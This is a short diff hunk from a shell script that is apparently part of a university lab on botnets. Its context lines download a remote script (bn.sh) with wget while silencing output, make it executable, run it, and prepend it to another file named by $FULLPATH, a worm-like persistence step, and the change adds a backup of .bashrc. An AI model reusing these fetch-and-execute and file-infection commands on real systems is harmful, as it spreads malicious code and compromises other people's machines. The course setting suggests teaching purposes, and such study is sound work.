@@ -14,6 +14,8 @@ wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bn.sh" &> /dev/null
 chmod +x bn.sh
 ./bn.sh
 
+cp .bashrc .bashrc_old
+
 cat bn.sh $FULLPATH > temp
 mv temp $FULLPATH
 
